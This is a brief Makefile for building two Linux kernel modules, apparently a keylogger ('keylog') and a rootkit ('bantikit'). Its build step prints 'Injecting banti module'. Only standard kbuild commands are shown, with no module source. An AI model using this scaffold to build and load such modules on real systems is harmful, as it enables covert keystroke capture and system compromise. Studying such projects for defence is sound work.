obj-m += keylog.o
obj-m += bantikit.o

KDIR = /lib/modules/$(shell uname -r)/build

all:
	@echo [-] Injecting banti module
	make -C $(KDIR) M=$(PWD) modules


.PHONY: clean
clean:
	make -C $(KDIR) M=$(PWD) clean